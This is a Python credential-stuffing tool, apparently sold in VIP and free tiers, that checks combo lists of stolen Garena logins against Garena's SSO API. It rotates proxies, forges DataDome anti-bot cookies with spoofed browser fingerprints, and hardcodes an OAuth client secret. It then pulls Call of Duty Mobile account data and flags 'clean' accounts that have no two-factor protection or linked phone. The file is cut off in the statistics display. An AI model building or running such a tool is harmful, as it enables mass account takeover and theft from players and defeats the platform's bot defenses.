#!/usr/bin/env python3
"""
Garena Account Checker with VIP/Free Priority & Queue System
=============================================================
Based on the original checker by @Yukiii_ii / @PokiePy

KEY DESIGN:
  - VIP keys: NO queue — instant processing, dedicated threads
  - Free keys: HAVE queue — wait in line, limited threads
  - Configurable VIP threads and Free threads
  - Auto-fix combo file on load
  - Full Garena checking (prelogin → login → account/init → CODM check)

Usage:
  python3 garena_checker_v2.py --combo combo.txt
  python3 garena_checker_v2.py --combo combo.txt --vip-threads 5 --free-threads 2
  python3 garena_checker_v2.py --combo combo.txt --proxy proxies.txt
"""

import os
import sys
import re
import time
import json
import random
import hashlib
import uuid
import base64
import gc
import threading
import logging
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event, Semaphore
from collections import Counter
from typing import List, Optional, Dict, Set, Tuple
from queue import Queue, PriorityQueue as StdPriorityQueue

import requests
import urllib.parse

try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES

import colorama
from colorama import Fore, Style, Back

colorama.init(autoreset=True)

# ============================================================
# LOGGING
# ============================================================

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
    }
    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger(__name__)
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

# ============================================================
# CONFIGURATION
# ============================================================

DEFAULT_CONFIG = {
    "vip_threads": 5,
    "free_threads": 2,
    "timeout": 15,
    "retry_count": 2,
    "retry_delay": 3,
    "output_dir": "results",
    "auto_fix_combo": True,
    "min_password_length": 3,
    "min_username_length": 2,
    "proxy_file": "",
    "use_proxy": False,
    "max_ip_block_retries": 2,
    "max_conn_retries": 2,
}

CONFIG_FILE = "config.json"

def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
        for key, value in DEFAULT_CONFIG.items():
            if key not in config:
                config[key] = value
        return config
    return DEFAULT_CONFIG.copy()

def save_config(config: dict):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

# ============================================================
# COLORS
# ============================================================

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    LIGHTCYAN_EX = colorama.Fore.LIGHTCYAN_EX
    LIGHTYELLOW_EX = colorama.Fore.LIGHTYELLOW_EX
    LIGHTRED_EX = colorama.Fore.LIGHTRED_EX
    LIGHTBLUE_EX = colorama.Fore.LIGHTBLUE_EX
    LIGHTWHITE_EX = colorama.Fore.LIGHTWHITE_EX
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    YELLOW = colorama.Fore.YELLOW
    MAGENTA = colorama.Fore.MAGENTA
    RESET = colorama.Style.RESET_ALL

# ============================================================
# COMBO FILE PARSER & FIXER
# ============================================================

class ComboParser:
    """Parse and auto-fix combo files."""

    def __init__(self, config: dict):
        self.config = config
        self.fixes = []
        self.skipped = []

    def parse(self, filepath: str) -> List[dict]:
        """Parse combo file, return list of {username, password, line_number}."""
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        accounts = []
        seen = set()

        for i, raw_line in enumerate(lines, 1):
            line = raw_line.strip()

            if not line:
                self.skipped.append((i, line, "Empty line"))
                continue

            account = self._parse_line(line, i)
            if account is None:
                continue

            # Dedup
            key = f"{account['username'].lower()}:{account['password']}"
            if key in seen:
                self.skipped.append((i, line, "Duplicate entry"))
                continue
            seen.add(key)

            accounts.append(account)

        return accounts

    def _parse_line(self, line: str, line_num: int) -> Optional[dict]:
        original = line

        # Handle multiple colons
        parts = line.split(':')
        if len(parts) > 2:
            if '/' in parts[0] and '@' not in parts[0]:
                self.skipped.append((line_num, original, "Malformed: app prefix with multiple colons"))
                self.fixes.append(f"Line {line_num}: SKIPPED malformed app prefix - '{original}'")
                return None
            else:
                username = parts[0]
                password = ':'.join(parts[1:])
                self.fixes.append(f"Line {line_num}: FIXED multiple colons - '{original}' -> '{username}:{password}'")
                line = f"{username}:{password}"
                parts = [username, password]

        if len(parts) < 2:
            self.skipped.append((line_num, original, "No colon separator found"))
            return None

        username = parts[0].strip()
        password = parts[1].strip()

        # Fix spaces in username
        if ' ' in username:
            self.fixes.append(f"Line {line_num}: FIXED spaces in username - '{username}' -> '{username.replace(' ', '_')}'")
            username = username.replace(' ', '_')

        # Fix invalid chars
        if not re.match(r'^[a-zA-Z0-9_.\-@]+$', username):
            clean_username = re.sub(r'[^a-zA-Z0-9_.\-@]', '', username)
            if clean_username:
                self.fixes.append(f"Line {line_num}: FIXED invalid chars - '{username}' -> '{clean_username}'")
                username = clean_username
            else:
                self.skipped.append((line_num, original, "Username empty after cleanup"))
                return None

        # Validate
        if not username:
            self.skipped.append((line_num, original, "Empty username"))
            return None
        if not password:
            self.skipped.append((line_num, original, "Empty password"))
            return None
        if len(username) < self.config.get('min_username_length', 2):
            self.skipped.append((line_num, original, f"Username too short: '{username}'"))
            return None
        if len(password) < self.config.get('min_password_length', 3):
            self.skipped.append((line_num, original, f"Password too short for '{username}'"))
            return None

        return {"username": username, "password": password, "line_number": line_num}

# ============================================================
# PROXY ROTATOR
# ============================================================

class ProxyRotator:
    """Thread-safe proxy rotation with dead proxy removal."""

    def __init__(self):
        self._lock = Lock()
        self._proxies = []
        self._thread_idx = {}
        self._global_idx = 0

    def load(self, filepath: str) -> int:
        if not os.path.exists(filepath):
            return 0
        proxies = []
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    normalized = self._normalize(line)
                    if normalized:
                        proxies.append(normalized)
        with self._lock:
            self._proxies = proxies
            self._thread_idx = {}
            self._global_idx = 0
        return len(proxies)

    def _normalize(self, line: str) -> Optional[str]:
        scheme = "http"
        orig = line
        if line.lower().startswith("https://"):
            scheme = "https"
            line = line[8:]
        elif line.lower().startswith("http://"):
            line = line[7:]

        if '@' in line:
            creds, _, hostport = line.partition('@')
            parts = hostport.rsplit(':', 1)
            if len(parts) == 2 and parts[1].isdigit():
                return f"{scheme}://{creds}@{hostport}"
            return None

        parts = line.split(':')
        if len(parts) == 2:
            host, port = parts
            if host and port.isdigit():
                return f"{scheme}://{host}:{port}"
        elif len(parts) == 4:
            ip, port, user, pwd = parts
            if ip and port.isdigit():
                return f"{scheme}://{user}:{pwd}@{ip}:{port}"
        return None

    def get_proxies(self) -> dict:
        """Get proxy dict for the current thread."""
        with self._lock:
            if not self._proxies:
                return {}
            tid = threading.get_ident()
            if tid not in self._thread_idx:
                self._thread_idx[tid] = self._global_idx % len(self._proxies)
                self._global_idx += 1
            idx = self._thread_idx[tid]
            proxy_url = self._proxies[idx]
        return {"http": proxy_url, "https": proxy_url}

    def rotate(self):
        """Advance current thread to next proxy."""
        with self._lock:
            if not self._proxies:
                return
            tid = threading.get_ident()
            current = self._thread_idx.get(tid, 0)
            self._thread_idx[tid] = (current + 1) % len(self._proxies)

    def force_rotate(self):
        """Rotate and return new proxy dict."""
        self.rotate()
        return self.get_proxies()

    def remove_and_rotate(self, proxy_url: str):
        """Remove dead proxy and rotate to next."""
        with self._lock:
            if proxy_url in self._proxies:
                idx = self._proxies.index(proxy_url)
                self._proxies.remove(proxy_url)
                for tid in list(self._thread_idx.keys()):
                    if self._thread_idx[tid] >= idx and self._thread_idx[tid] > 0:
                        self._thread_idx[tid] -= 1
        self.rotate()

    @property
    def total(self):
        with self._lock:
            return len(self._proxies)

proxy_rotator = ProxyRotator()

# ============================================================
# GARENA CRYPTO FUNCTIONS (from original)
# ============================================================

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

# ============================================================
# DATADOME MANAGER
# ============================================================

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie

    def get_datadome(self):
        return self.current_datadome

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def handle_403(self, session):
        """On 403 — force-rotate proxy, refresh DataDome."""
        self._403_attempts += 1
        logger.warning(f"[403] Access denied — force-rotating proxy (attempt #{self._403_attempts})")

        for rot_attempt in range(3):
            try:
                if rot_attempt == 0:
                    session.proxies.update(proxy_rotator.force_rotate())
                else:
                    proxy_rotator.rotate()
                    session.proxies.update(proxy_rotator.get_proxies())

                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                    self._403_attempts = 0
                    return True
            except Exception as e:
                logger.warning(f"[403] Rotation attempt {rot_attempt+1} failed: {e}")

        return False

# ============================================================
# DATADOME COOKIE FETCHER
# ============================================================

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }

    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = session.post(url, headers=headers, data=data, timeout=5)
        response.raise_for_status()
        response_json = response.json()

        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            logger.error(f"DataDome cookie not found. Status: {response_json.get('status')}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Error getting DataDome cookie: {e}")
        return None

# ============================================================
# PRELOGIN (from original)
# ============================================================

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'

    try:
        account.encode('latin-1')
    except UnicodeEncodeError:
        logger.warning(f"   ⚠️ Skipping: {account} (unsupported characters)")
        return None, None, None

    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }

    retries = 2
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }

            if cookie_header:
                headers['cookie'] = cookie_header

            if attempt > 0:
                logger.info(f"      🔄 Retry {attempt + 1}/{retries}")

            response = session.get(url, headers=headers, params=params, timeout=5)

            new_cookies = {}
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass

            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception:
                pass

            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)

            new_datadome = new_cookies.get('datadome')

            if response.status_code == 403:
                logger.error(f"      🚫 Access denied (403)")
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"      🚨 IP blocked - cannot continue")
                    return None, None, new_datadome

            response.raise_for_status()

            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      ✘ Invalid response format")
                if attempt < retries - 1:
                    time.sleep(0.02 * (2 ** attempt))
                    continue
                return None, None, new_datadome

            if 'error' in data:
                logger.error(f"      ✘ Error: {data['error']}")
                return None, None, new_datadome

            v1 = data.get('v1')
            v2 = data.get('v2')

            if not v1 or not v2:
                logger.error(f"      ✘ Missing authentication data")
                return None, None, new_datadome

            logger.info(f"   ✔ Prelogin successful")
            return v1, v2, new_datadome

        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    return None, None, None
            if attempt < retries - 2:
                time.sleep(0.02 * (2 ** attempt))
        except requests.exceptions.ConnectionError:
            logger.warning(f"      🔌 Proxy dead/rate-limited")
            return "CONN_ERROR", None, None
        except requests.exceptions.Timeout:
            logger.warning(f"      ⏱️ Proxy timeout")
            return "CONN_ERROR", None, None
        except Exception as e:
            err = str(e)
            if any(kw in err for kw in ('ConnectionPool', 'HTTPSConnection', 'Max retries', 'RemoteDisconnected', 'ProxyError')):
                logger.warning(f"      🔌 Proxy connection failed")
                return "CONN_ERROR", None, None
            logger.error(f"      💥 Unexpected error: {err[:50]}")

    return None, None, None

# ============================================================
# LOGIN (from original)
# ============================================================

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }

    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    if cookie_header:
        headers['cookie'] = cookie_header

    retries = 2
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=5)
            response.raise_for_status()

            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass

            try:
                response_cookies = response.cookies.get_dict()
                for cn, cv in response_cookies.items():
                    if cn not in login_cookies:
                        login_cookies[cn] = cv
            except Exception:
                pass

            for cn, cv in login_cookies.items():
                if cn in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cn, cv, domain='.garena.com')

            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.02 * (2 ** attempt))
                    continue
                return None

            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')

            if 'error' in data:
                error_msg = data['error']
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    return None
                elif 'captcha' in error_msg.lower():
                    proxy_rotator.force_rotate()
                    session.proxies.update(proxy_rotator.get_proxies())
                    time.sleep(0.02 * (2 ** attempt))
                    continue
                else:
                    return None

            return sso_key

        except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError):
            session.proxies.update(proxy_rotator.force_rotate())
            if attempt < retries - 1:
                time.sleep(0.02 * (2 ** attempt))
        except requests.RequestException as e:
            if attempt < retries - 1:
                time.sleep(0.02 * (2 ** attempt))

    return None

# ============================================================
# CODM CHECK (from original)
# ============================================================

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
        }

        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'

        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=5)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')

        if not auth_code:
            return ('', '', '')

        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
        }

        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'

        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=5)
        token_json = token_response.json()

        return (token_json.get('access_token', ''), token_json.get('open_id', ''), token_json.get('uid', ''))

    except Exception as e:
        logger.error(f'Error getting CODM access token: {e}')
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
            'referer': 'https://auth.garena.com/'
        }

        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=5)
        location = old_response.headers.get('Location', '')

        if 'err=3' in location:
            return (None, 'no_codm')
        if 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')

        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'referer': 'https://100082.connect.garena.com/',
            'x-requested-with': 'com.garena.game.codm'
        }

        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=5)
        aos_location = aos_response.headers.get('Location', '')

        if 'err=3' in aos_location:
            return (None, 'no_codm')
        if 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')

        return (None, 'unknown_error')

    except Exception as e:
        logger.error(f'Error processing CODM callback: {e}')
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        parts = token.split('.')
        if len(parts) == 3:
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            jwt_data = json.loads(decoded)
            user_data = jwt_data.get('user', {})
            if user_data:
                return {
                    'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                    'codm_level': user_data.get('codm_level', 'N/A'),
                    'region': user_data.get('region', 'N/A'),
                    'uid': user_data.get('uid', 'N/A'),
                    'open_id': user_data.get('open_id', 'N/A'),
                    't_open_id': user_data.get('t_open_id', 'N/A')
                }

        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'codm-delete-token': token,
            'origin': 'https://delete-request-aos.codm.garena.co.id',
            'referer': 'https://delete-request-aos.codm.garena.co.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'x-requested-with': 'com.garena.game.codm'
        }

        response = session.get(url, headers=headers, timeout=5)
        data = response.json()
        user_data = data.get('user', {})

        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        return {}
    except Exception as e:
        logger.error(f'Error getting CODM user info: {e}')
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    for codm_attempt in range(2):
        try:
            access_token, open_id, uid = get_codm_access_token(session)
            if not access_token:
                if codm_attempt == 0:
                    time.sleep(0.02)
                    continue
                return (has_codm, codm_info)

            codm_token, status = process_codm_callback(session, access_token, open_id, uid)
            if status == 'no_codm':
                return (has_codm, codm_info)
            if status != 'success' or not codm_token:
                if codm_attempt == 0:
                    time.sleep(0.02)
                    continue
                return (has_codm, codm_info)

            codm_info = get_codm_user_info(session, codm_token)
            if codm_info:
                has_codm = True
                logger.info(f"      └─ 🎮 CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
            return (has_codm, codm_info)
        except Exception as e:
            if codm_attempt == 0:
                time.sleep(0.02)
                continue
            logger.error(f'      └─ ✘ Error checking CODM: {e}')
    return (has_codm, codm_info)

# ============================================================
# ACCOUNT DETAILS PARSER
# ============================================================

def parse_account_details(account_data):
    user_info = account_data.get('user_info', account_data)
    personal = user_info.get('personal', {})
    security = user_info.get('security', {})
    profile = user_info.get('profile', {})
    status = user_info.get('status', {})

    # Determine if clean
    is_clean = True
    if security.get('two_step_verify') or security.get('authenticator_app'):
        is_clean = False
    email_val = user_info.get('email', '')
    email_verified = user_info.get('email_verified', False)
    mobile = personal.get('mobile_no', '')
    if mobile and str(mobile).strip():
        is_clean = False

    return {
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': email_val if email_val else 'N/A',
        'email_verified': email_verified,
        'personal': personal,
        'security': security,
        'profile': profile,
        'status': status,
        'is_clean': is_clean,
    }

# ============================================================
# LIVE STATS
# ============================================================

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.total_processed = 0
        self.lock = Lock()
        self.start_time = None
        self.total_accounts = 0
        self.vip_processed = 0
        self.free_processed = 0
        self.free_queued = 0

    def start_tracking(self, total_accounts):
        with self.lock:
            self.start_time = time.time()
            self.total_accounts = total_accounts

    def update_stats(self, valid=False, clean=False, has_codm=False, is_vip=False):
        with self.lock:
            self.total_processed += 1
            if is_vip:
                self.vip_processed += 1
            else:
                self.free_processed += 1
            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time if self.start_time else 0
            speed = self.total_processed / elapsed if elapsed > 0 else 0
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'total': self.total_processed,
                'speed': round(speed, 2),
                'elapsed': elapsed,
                'total_accounts': self.total_accounts,
                'vip_processed': self.vip_processed,
                'free_processed': self.free_processed,
            }

    def display_stats(self):
        stats = self.get_stats()
        success_rate = (stats['valid'] / stats['total'] * 100) if stats['total'] > 0 else 0
        eta_secs = ((stats['total_accounts'] - stats['total']) / stats['speed']) if stats['speed'] > 0 else 0

        cyan = '\033[1;96m'
        white = '\033[1;37m'
        green = '\033[1;92m'
        red = '\033[1;91m'
        yellow = '\033[1;93m'
        magenta = '\033[1;95m'
        blue = '\033[1;94m'
        gray = '\033[90m'
        reset = '\033[0m'

        pct = stats['total'] / stats['total_accounts'] if stats['total_accounts'] > 0 else 0
        filled = int(30 * pct)
        bar = "█" * filled + "░" * (30 - filled)

        return (
            f"\n{cyan}╔══════════════════════════════════════════════════════════╗{reset}\n"
